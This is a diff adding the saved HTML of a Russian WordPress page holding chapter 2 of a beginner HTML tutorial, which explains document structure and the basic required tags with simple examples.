@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="ru-RU" prefix="og: http://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="pingback" href="https://i-vd.org.ru/xmlrpc.php" />
+
+	<!-- This site is optimized with the Yoast SEO plugin v14.7 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Простой пример HTML документа - Учебник по основам HTML</title>
+	<meta name="description" content="В этой статье вы узнаете как устроен HTML-документ, а также про обязательные метки." />
+	<meta name="robots" content="index, follow" />
+	<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://i-vd.org.ru/chapter2/" />
+	<meta property="og:locale" content="ru_RU" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Простой пример HTML документа - Учебник по основам HTML" />
+	<meta property="og:description" content="В этой статье вы узнаете как устроен HTML-документ, а также про обязательные метки." />
+	<meta property="og:url" content="https://i-vd.org.ru/chapter2/" />
+	<meta property="og:site_name" content="Статьи для веб-мастера" />
+	<meta property="article:published_time" content="2020-08-03T14:00:47+00:00" />
+	<meta property="article:modified_time" content="2020-08-27T11:09:56+00:00" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://i-vd.org.ru/#website","url":"https://i-vd.org.ru/","name":"\u0421\u0442\u0430\u0442\u044c\u0438 \u0434\u043b\u044f \u0432\u0435\u0431-\u043c\u0430\u0441\u0442\u0435\u0440\u0430","description":"","publisher":{"@id":"https://i-vd.org.ru/#/schema/person/3da280b037769664a529d91b1554e535"},"potentialAction":[{"@type":"SearchAction","target":"https://i-vd.org.ru/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"ru-RU"},{"@type":"WebPage","@id":"https://i-vd.org.ru/chapter2/#webpage","url":"https://i-vd.org.ru/chapter2/","name":"\u041f\u0440\u043e\u0441\u0442\u043e\u0439 \u043f\u0440\u0438\u043c\u0435\u0440 HTML \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430 - \u0423\u0447\u0435\u0431\u043d\u0438\u043a \u043f\u043e \u043e\u0441\u043d\u043e\u0432\u0430\u043c HTML","isPartOf":{"@id":"https://i-vd.org.ru/#website"},"datePublished":"2020-08-03T14:00:47+00:00","dateModified":"2020-08-27T11:09:56+00:00","description":"\u0412 \u044d\u0442\u043e\u0439 \u0441\u0442\u0430\u0442\u044c\u0435 \u0432\u044b \u0443\u0437\u043d\u0430\u0435\u0442\u0435 \u043a\u0430\u043a \u0443\u0441\u0442\u0440\u043e\u0435\u043d HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442, \u0430 \u0442\u0430\u043a\u0436\u0435 \u043f\u0440\u043e \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043c\u0435\u0442\u043a\u0438.","inLanguage":"ru-RU","potentialAction":[{"@type":"ReadAction","target":["https://i-vd.org.ru/chapter2/"]}]},{"@type":"Article","@id":"https://i-vd.org.ru/chapter2/#article","isPartOf":{"@id":"https://i-vd.org.ru/chapter2/#webpage"},"author":{"@id":"https://i-vd.org.ru/#/schema/person/3da280b037769664a529d91b1554e535"},"headline":"\u0413\u043b\u0430\u0432\u0430 2. \u041d\u0430\u0448 \u043f\u0435\u0440\u0432\u044b\u0439 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442","datePublished":"2020-08-03T14:00:47+00:00","dateModified":"2020-08-27T11:09:56+00:00","mainEntityOfPage":{"@id":"https://i-vd.org.ru/chapter2/#webpage"},"publisher":{"@id":"https://i-vd.org.ru/#/schema/person/3da280b037769664a529d91b1554e535"},"articleSection":"\u0423\u0447\u0435\u0431\u043d\u0438\u043a \u043f\u043e \u043e\u0441\u043d\u043e\u0432\u0430\u043c HTML","inLanguage":"ru-RU"},{"@type":["Person","Organization"],"@id":"https://i-vd.org.ru/#/schema/person/3da280b037769664a529d91b1554e535","name":"nikto123","image":{"@type":"ImageObject","@id":"https://i-vd.org.ru/#personlogo","inLanguage":"ru-RU","url":"https://secure.gravatar.com/avatar/ce9a0a294633a23022e57cc7a848cf44?s=96&d=mm&r=g","caption":"nikto123"},"logo":{"@id":"https://i-vd.org.ru/#personlogo"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Статьи для веб-мастера &raquo; Лента" href="https://i-vd.org.ru/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Статьи для веб-мастера &raquo; Лента комментариев" href="https://i-vd.org.ru/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Статьи для веб-мастера &raquo; Лента комментариев к &laquo;Глава 2. Наш первый HTML-документ&raquo;" href="https://i-vd.org.ru/chapter2/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/i-vd.org.ru\/wp-includes\/js\/wp-emoji-release.min.js"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://i-vd.org.ru/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='tie-style-css'  href='https://i-vd.org.ru/wp-content/themes/sahifa/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='tie-ilightbox-skin-css'  href='https://i-vd.org.ru/wp-content/themes/sahifa/css/ilightbox/dark-skin/skin.css' type='text/css' media='all' />
+<link rel='stylesheet' id='Droid+Sans-css'  href='https://fonts.googleapis.com/css?family=Droid+Sans%3Aregular%2C700' type='text/css' media='all' />
+<script type='text/javascript' src='https://i-vd.org.ru/wp-includes/js/jquery/jquery.js' id='jquery-js'></script>
+<link rel="https://api.w.org/" href="https://i-vd.org.ru/wp-json/" /><link rel="alternate" type="application/json" href="https://i-vd.org.ru/wp-json/wp/v2/posts/170" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://i-vd.org.ru/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://i-vd.org.ru/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.5" />
+<link rel='shortlink' href='https://i-vd.org.ru/?p=170' />
+<link rel="alternate" type="application/json+oembed" href="https://i-vd.org.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fi-vd.org.ru%2Fchapter2%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://i-vd.org.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fi-vd.org.ru%2Fchapter2%2F&#038;format=xml" />
+<link rel="shortcut icon" href="https://i-vd.org.ru/wp-content/themes/sahifa/favicon.ico" title="Favicon" />
+<!--[if IE]>
+<script type="text/javascript">jQuery(document).ready(function (){ jQuery(".menu-item").has("ul").children("a").attr("aria-haspopup", "true");});</script>
+<![endif]-->
+<!--[if lt IE 9]>
+<script src="https://i-vd.org.ru/wp-content/themes/sahifa/js/html5.js"></script>
+<script src="https://i-vd.org.ru/wp-content/themes/sahifa/js/selectivizr-min.js"></script>
+<![endif]-->
+<!--[if IE 9]>
+<link rel="stylesheet" type="text/css" media="all" href="https://i-vd.org.ru/wp-content/themes/sahifa/css/ie9.css" />
+<![endif]-->
+<!--[if IE 8]>
+<link rel="stylesheet" type="text/css" media="all" href="https://i-vd.org.ru/wp-content/themes/sahifa/css/ie8.css" />
+<![endif]-->
+<!--[if IE 7]>
+<link rel="stylesheet" type="text/css" media="all" href="https://i-vd.org.ru/wp-content/themes/sahifa/css/ie7.css" />
+<![endif]-->
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-174271583-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-174271583-1');
+</script>
+
+<style type="text/css" media="screen">
+
+body{
+	font-family: 'Droid Sans';
+	font-size : 15px;
+}
+
+.logo h1 a, .logo h2 a{
+	font-family: "Palatino Linotype", "Book Antiqua", Palatino, serif;
+	font-size : 29px;
+}
+
+body.single .entry, body.page .entry{
+	font-family: Georgia, serif;
+	font-size : 16px;
+}
+
+#main-nav,
+.cat-box-content,
+#sidebar .widget-container,
+.post-listing,
+#commentform {
+	border-bottom-color: #356591;
+}
+
+.search-block .search-button,
+#topcontrol,
+#main-nav ul li.current-menu-item a,
+#main-nav ul li.current-menu-item a:hover,
+#main-nav ul li.current_page_parent a,
+#main-nav ul li.current_page_parent a:hover,
+#main-nav ul li.current-menu-parent a,
+#main-nav ul li.current-menu-parent a:hover,
+#main-nav ul li.current-page-ancestor a,
+#main-nav ul li.current-page-ancestor a:hover,
+.pagination span.current,
+.share-post span.share-text,
+.flex-control-paging li a.flex-active,
+.ei-slider-thumbs li.ei-slider-element,
+.review-percentage .review-item span span,
+.review-final-score,
+.button,
+a.button,
+a.more-link,
+#main-content input[type="submit"],
+.form-submit #submit,
+#login-form .login-button,
+.widget-feedburner .feedburner-subscribe,
+input[type="submit"],
+#buddypress button,
+#buddypress a.button,
+#buddypress input[type=submit],
+#buddypress input[type=reset],
+#buddypress ul.button-nav li a,
+#buddypress div.generic-button a,
+#buddypress .comment-reply-link,
+#buddypress div.item-list-tabs ul li a span,
+#buddypress div.item-list-tabs ul li.selected a,
+#buddypress div.item-list-tabs ul li.current a,
+#buddypress #members-directory-form div.item-list-tabs ul li.selected span,
+#members-list-options a.selected,
+#groups-list-options a.selected,
+body.dark-skin #buddypress div.item-list-tabs ul li a span,
+body.dark-skin #buddypress div.item-list-tabs ul li.selected a,
+body.dark-skin #buddypress div.item-list-tabs ul li.current a,
+body.dark-skin #members-list-options a.selected,
+body.dark-skin #groups-list-options a.selected,
+.search-block-large .search-button,
+#featured-posts .flex-next:hover,
+#featured-posts .flex-prev:hover,
+a.tie-cart span.shooping-count,
+.woocommerce span.onsale,
+.woocommerce-page span.onsale ,
+.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,
+.woocommerce-page .widget_price_filter .ui-slider .ui-slider-handle,
+#check-also-close,
+a.post-slideshow-next,
+a.post-slideshow-prev,
+.widget_price_filter .ui-slider .ui-slider-handle,
+.quantity .minus:hover,
+.quantity .plus:hover,
+.mejs-container .mejs-controls .mejs-time-rail .mejs-time-current,
+#reading-position-indicator  {
+	background-color:#356591;
+}
+
+::-webkit-scrollbar-thumb{
+	background-color:#356591 !important;
+}
+
+#theme-footer,
+#theme-header,
+.top-nav ul li.current-menu-item:before,
+#main-nav .menu-sub-content ,
+#main-nav ul ul,
+#check-also-box {
+	border-top-color: #356591;
+}
+
+.search-block:after {
+	border-right-color:#356591;
+}
+
+body.rtl .search-block:after {
+	border-left-color:#356591;
+}
+
+#main-nav ul > li.menu-item-has-children:hover > a:after,
+#main-nav ul > li.mega-menu:hover > a:after {
+	border-color:transparent transparent #356591;
+}
+
+.widget.timeline-posts li a:hover,
+.widget.timeline-posts li a:hover span.tie-date {
+	color: #356591;
+}
+
+.widget.timeline-posts li a:hover span.tie-date:before {
+	background: #356591;
+	border-color: #356591;
+}
+
+#order_review,
+#order_review_heading {
+	border-color: #356591;
+}
+
+
+body.single .post .entry a, body.page .post .entry a {
+	color: #2285d6;
+}
+		
+.entry table {
+	border-spacing: 0;
+	width: 100%;
+	border: 1px solid #eee;
+	border-collapse: separate;
+	margin-bottom: 1px;
+}
+
+.entry table td, .entry table th {
+    text-align: left;
+}</style>
+
+<script>var ajaxUrlFlatPM = "https://i-vd.org.ru/wp-admin/admin-ajax.php", untilscrollFlatPM = ".flat_pm_end"</script></head>
+<body id="top" class="post-template-default single single-post postid-170 single-format-standard lazy-enabled">
+
+<div class="wrapper-outer">
+
+	<div class="background-cover"></div>
+
+	<aside id="slide-out">
+
+			<div class="search-mobile">
+			<form method="get" id="searchform-mobile" action="https://i-vd.org.ru/">
+				<button class="search-button" type="submit" value="Поиск"><i class="fa fa-search"></i></button>
+				<input type="text" id="s-mobile" name="s" title="Поиск" value="Поиск" onfocus="if (this.value == 'Поиск') {this.value = '';}" onblur="if (this.value == '') {this.value = 'Поиск';}"  />
+			</form>
+		</div><!-- .search-mobile /-->
+	
+			<div class="social-icons">
+		<a class="ttip-none" title="Rss" href="https://i-vd.org.ru/feed/" target="_blank"><i class="fa fa-rss"></i></a>
+			</div>
+
+	
+		<div id="mobile-menu" ></div>
+	</aside><!-- #slide-out /-->
+
+		<div id="wrapper" class="boxed-all">
+		<div class="inner-wrapper">
+
+		<header id="theme-header" class="theme-header">
+			
+		<div class="header-content">
+
+					<a id="slide-out-open" class="slide-out-open" href="#"><span></span></a>
+		
+			<div class="logo" style=" margin-top:15px; margin-bottom:15px;">
+			<h2>				<a  href="https://i-vd.org.ru/">Статьи для веб-мастера</a>
+				<span></span>
+							</h2>			</div><!-- .logo /-->
+						<div class="clear"></div>
+
+		</div>
+													<nav id="main-nav">
+				<div class="container">
+
+				
+															<a href="https://i-vd.org.ru/?tierand=1" class="random-article ttip" title="Случайные записи"><i class="fa fa-random"></i></a>
+					
+					
+				</div>
+			</nav><!-- .main-nav /-->
+					</header><!-- #header /-->
+
+	
+	
+	<div id="main-content" class="container sidebar-right">
+
+	
+	
+	
+	
+	
+	<div class="content">
+
+		
+<div class="breadcrumbs" typeof="BreadcrumbList" vocab="https://schema.org/">
+    <!-- Breadcrumb NavXT 6.5.0 -->
+<span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Перейти к Статьи для веб-мастера." href="https://i-vd.org.ru" class="home" ><span property="name">Главная</span></a><meta property="position" content="1"></span> &gt; <span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Перейти к архиву рубрики Учебники." href="https://i-vd.org.ru/category/books/" class="taxonomy category" ><span property="name">Учебники</span></a><meta property="position" content="2"></span> &gt; <span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Перейти к архиву рубрики Учебник по основам HTML." href="https://i-vd.org.ru/category/books/html-begin/" class="taxonomy category" ><span property="name">Учебник по основам HTML</span></a><meta property="position" content="3"></span> &gt; <span property="itemListElement" typeof="ListItem"><span property="name" class="post post-post current-item">Глава 2. Наш первый HTML-документ</span><meta property="url" content="https://i-vd.org.ru/chapter2/"><meta property="position" content="4"></span></div>
+
+		
+
+		<div class="e3lan e3lan-post">			<!-- Yandex.RTB R-A-625993-1 -->
+<div id="yandex_rtb_R-A-625993-1"></div>
+<script type="text/javascript">
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-625993-1",
+                renderTo: "yandex_rtb_R-A-625993-1",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+</script>				</div>
+		<article class="post-listing post-170 post type-post status-publish format-standard  category-html-begin" id="the-post">
+			
+			<div class="post-inner">
+
+							<h1 class="name post-title entry-title"><span itemprop="name">Глава 2. Наш первый HTML-документ</span></h1>
+
+						
+<p class="post-meta">
+	
+	
+	<span class="post-cats"><i class="fa fa-folder"></i><a href="https://i-vd.org.ru/category/books/html-begin/" rel="category tag">Учебник по основам HTML</a></span>
+	
+</p>
+<div class="clear"></div>
+			
+				<div class="entry">
+					
+					
+					<div class="flat_pm_start"></div>
+<h2>Как устроен HTML-документ</h2>
+<p align="justify">HTML-документ — это просто текстовый файл с расширением <tt>*.html</tt> (Unix-системы могут содержать файлы с расширением <tt>*.htmll</tt>). Вот самый простой HTML-документ:</p>
+<p><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;title&gt;Пример 1&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;H1&gt;Привет!&lt;/H1&gt;<br />
+&lt;P&gt; Это простейший пример HTML-документа. &lt;/P&gt;<br />
+&lt;P&gt; Этот *.html-файл может быть одновременно открыт и в Notepad, и в Netscape. Сохранив изменения в Notepad, просто нажмите кнопку Reload ('перезагрузить') в Netscape, чтобы увидеть эти изменения реализованными в HTML-документе. &lt;/P&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;<br />
+</code></p>
+<p>Для удобства чтения я ввел дополнительные отступы, однако в HTML это совсем не обязательно. Более того, браузеры просто игнорируют символы конца строки и множественные пробелы в HTML-файлах. Поэтому наш пример вполне мог бы выглядеть и вот так:</p>
+<p><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;title&gt;Пример 1&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;H1&gt;Привет!&lt;/H1&gt;<br />
+&lt;P&gt;Это простейший пример HTML-документа.&lt;/P&gt;<br />
+&lt;P&gt;Этот *.html-файл может быть одновременно открыт и в Notepad, и в Netscape. Сохранив изменения в Notepad, просто нажмите кнопку Reload ('перезагрузить') в Netscape, чтобы увидеть эти изменения реализованными в HTML-документе.&lt;/P&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;<br />
+</code></p>
+<p align="justify">Как видно из примера, вся информация о форматировании документа сосредоточена в его фрагментах, заключенных между знаками "&lt;" и "&gt;". Такой фрагмент (например, <tt>&lt;html&gt;</tt>) называется меткой (по-английски — tag, читается "тэг").</p>
+<p align="justify">Большинство HTML-меток — парные, то есть на каждую открывающую метку вида <tt>&lt;tag&gt;</tt> есть закрывающая метка вида <tt>&lt;/tag&gt;</tt> с тем же именем, но с добавлением "/".</p>
+<p align="justify">Метки можно вводить как большими, так и маленькими буквами. Например, метки <tt>&lt;body&gt;</tt>, <tt>&lt;BODY&gt;</tt> и <tt>&lt;Body&gt;</tt> будут восприняты браузером одинаково.</p>
+<p align="justify">Многие метки, помимо имени, могут содержать <b>атрибуты</b> — элементы, дающие дополнительную информацию о том, как браузер должен обработать текущую метку. В нашем простейшем документе, однако, нет ни одного атрибута. Но мы обязательно встретимся с атрибутами уже в следующем разделе.</p>
+<h3>Обязательные метки</h3>
+<p><strong>&lt;html&gt; ... &lt;/html&gt;</strong></p>
+<p align="justify">Метка <tt>&lt;html&gt;</tt> должна открывать HTML-документ. Аналогично, метка <tt>&lt;/html&gt;</tt> должна завершать HTML-документ.</p>
+<p><strong>&lt;head&gt; ... &lt;/head&gt;</strong></p>
+<p align="justify">Эта пара меток указывает на начало и конец заголовка документа. Помимо наименования документа (см. описание метки <tt>&lt;title&gt;</tt> ниже), в этот раздел может включаться множество служебной информации, о которой мы обязательно поговорим чуть позже.</p>
+<p><strong>&lt;title&gt; ... &lt;/title&gt;</strong></p>
+<p align="justify">Все, что находится между метками <tt>&lt;title&gt;</tt> и <tt>&lt;/title&gt;</tt>, толкуется браузером как название документа. <i>Netscape Navigator</i>, например, показывает название текущего документа в заголовке окна и печатает его в левом верхнем углу каждой страницы при выводе на принтер. Рекомендуется название не длиннее 64 символов.</p>
+<p><strong>&lt;body&gt; ... &lt;/body&gt;</strong></p>
+<p align="justify">Эта пара меток указывает на начало и конец тела HTML-документа, каковое тело, собственно, и определяет содержание документа.</p>
+<p><strong>&lt;H1&gt; ... &lt;/H1&gt; — &lt;H6&gt; ... &lt;/H6&gt;</strong></p>
+<p align="justify">Метки вида <tt>&lt;Hi&gt;</tt> (где <tt>i</tt> — цифра от 1 до 6) описывают заголовки шести различных уровней. Заголовок первого уровня — самый крупный, шестого уровня, естественно — самый мелкий.</p>
+<p><strong>&lt;P&gt; ... &lt;/P&gt;</strong></p>
+<p align="justify">Такая пара меток описывает абзац. Все, что заключено между <tt>&lt;P&gt;</tt> и <tt>&lt;/P&gt;</tt>, воспринимается как один абзац.</p>
+<p align="justify">Метки <tt>&lt;Hi&gt;</tt> и <tt>&lt;P&gt;</tt> могут содержать дополнительный атрибут <tt>ALIGN</tt> (читается "элайн", от английского "выравнивать"), например:</p>
+<p><code>&lt;H1 ALIGN=CENTER&gt;Выравнивание заголовка по центру&lt;/H1&gt;</code></p>
+<p align="justify">или</p>
+<p><code>&lt;P ALIGN=RIGHT&gt;Образец абзаца с выравниванием по правому краю&lt;/P&gt;</code></p>
+<p align="justify">Подытожим все, что мы знаем, с помощью примера 2:</p>
+<p><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;title&gt;Пример 2&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;H1 ALIGN=CENTER&gt;Привет!&lt;/H1&gt;<br />
+&lt;H2&gt;Это чуть более сложный пример HTML-документа&lt;/H2&gt;<br />
+&lt;P&gt;Теперь мы знаем, что абзац можно выравнивать не только влево, &lt;/P&gt;<br />
+&lt;P ALIGN=CENTER&gt;но и по центру&lt;/P&gt;<br />
+&lt;P ALIGN=RIGHT&gt;или по правому краю.&lt;/P&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></p>
+<p align="justify">С этого момента Вы знаете достаточно, чтобы создавать простые HTML-документы самостоятельно от начала до конца. В следующем разделе мы поговорим, как можно улучшить наш простой HTML-документ. Начнем с малого — с абзаца.</p>
+<div class="flat_pm_end"></div>
+
+					
+									</div><!-- .entry /-->
+
+
+				<div class="share-post">
+	<span class="share-text">Поделиться</span>
+
+		<ul class="flat-social">
+			<li><a href="http://www.facebook.com/sharer.php?u=https://i-vd.org.ru/?p=170" class="social-facebook" rel="external" target="_blank"><i class="fa fa-facebook"></i> <span>Facebook</span></a></li>
+				<li><a href="https://twitter.com/intent/tweet?text=%D0%93%D0%BB%D0%B0%D0%B2%D0%B0+2.+%D0%9D%D0%B0%D1%88+%D0%BF%D0%B5%D1%80%D0%B2%D1%8B%D0%B9+HTML-%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82&url=https://i-vd.org.ru/?p=170" class="social-twitter" rel="external" target="_blank"><i class="fa fa-twitter"></i> <span>Twitter</span></a></li>
+				<li><a href="http://www.stumbleupon.com/submit?url=https://i-vd.org.ru/?p=170&title=%D0%93%D0%BB%D0%B0%D0%B2%D0%B0+2.+%D0%9D%D0%B0%D1%88+%D0%BF%D0%B5%D1%80%D0%B2%D1%8B%D0%B9+HTML-%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82" class="social-stumble" rel="external" target="_blank"><i class="fa fa-stumbleupon"></i> <span>Stumbleupon</span></a></li>
+				<li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://i-vd.org.ru/?p=170&title=%D0%93%D0%BB%D0%B0%D0%B2%D0%B0+2.+%D0%9D%D0%B0%D1%88+%D0%BF%D0%B5%D1%80%D0%B2%D1%8B%D0%B9+HTML-%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82" class="social-linkedin" rel="external" target="_blank"><i class="fa fa-linkedin"></i> <span>LinkedIn</span></a></li>
+				<li><a href="http://pinterest.com/pin/create/button/?url=https://i-vd.org.ru/?p=170&amp;description=%D0%93%D0%BB%D0%B0%D0%B2%D0%B0+2.+%D0%9D%D0%B0%D1%88+%D0%BF%D0%B5%D1%80%D0%B2%D1%8B%D0%B9+HTML-%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82&amp;media=" class="social-pinterest" rel="external" target="_blank"><i class="fa fa-pinterest"></i> <span>Pinterest</span></a></li>
+		</ul>
+		<div class="clear"></div>
+</div> <!-- .share-post -->
+				<div class="clear"></div>
+			</div><!-- .post-inner -->
+
+			<script type="application/ld+json">{"@context":"http:\/\/schema.org","@type":"Article","dateCreated":"2020-08-03T17:00:47+03:00","datePublished":"2020-08-03T17:00:47+03:00","dateModified":"2020-08-27T14:09:56+03:00","headline":"\u0413\u043b\u0430\u0432\u0430 2. \u041d\u0430\u0448 \u043f\u0435\u0440\u0432\u044b\u0439 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442","name":"\u0413\u043b\u0430\u0432\u0430 2. \u041d\u0430\u0448 \u043f\u0435\u0440\u0432\u044b\u0439 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442","keywords":[],"url":"https:\/\/i-vd.org.ru\/chapter2\/","description":"\u041a\u0430\u043a \u0443\u0441\u0442\u0440\u043e\u0435\u043d HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442 \u2014 \u044d\u0442\u043e \u043f\u0440\u043e\u0441\u0442\u043e \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c *.html (Unix-\u0441\u0438\u0441\u0442\u0435\u043c\u044b \u043c\u043e\u0433\u0443\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c *.htmll). \u0412\u043e\u0442 \u0441\u0430\u043c\u044b\u0439 \u043f\u0440\u043e\u0441\u0442\u043e\u0439 HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442: &lt;html&gt; &lt;h","copyrightYear":"2020","publisher":{"@id":"#Publisher","@type":"Organization","name":"\u0421\u0442\u0430\u0442\u044c\u0438 \u0434\u043b\u044f \u0432\u0435\u0431-\u043c\u0430\u0441\u0442\u0435\u0440\u0430","logo":{"@type":"ImageObject","url":"https:\/\/i-vd.org.ru\/wp-content\/themes\/sahifa\/images\/logo@2x.png"}},"sourceOrganization":{"@id":"#Publisher"},"copyrightHolder":{"@id":"#Publisher"},"mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/i-vd.org.ru\/chapter2\/"},"author":{"@type":"Person","name":"nikto123","url":"https:\/\/i-vd.org.ru\/author\/nikto123\/"},"articleSection":"\u0423\u0447\u0435\u0431\u043d\u0438\u043a \u043f\u043e \u043e\u0441\u043d\u043e\u0432\u0430\u043c HTML","articleBody":"\u041a\u0430\u043a \u0443\u0441\u0442\u0440\u043e\u0435\u043d HTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\r\nHTML-\u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442 \u2014 \u044d\u0442\u043e \u043f\u0440\u043e\u0441\u0442\u043e \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c *.html (Unix-\u0441\u0438\u0441\u0442\u0435\u043c\u044b \u043c\u043e\u0433\u0443\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c *.htmll). \u0412\u043e\u0442 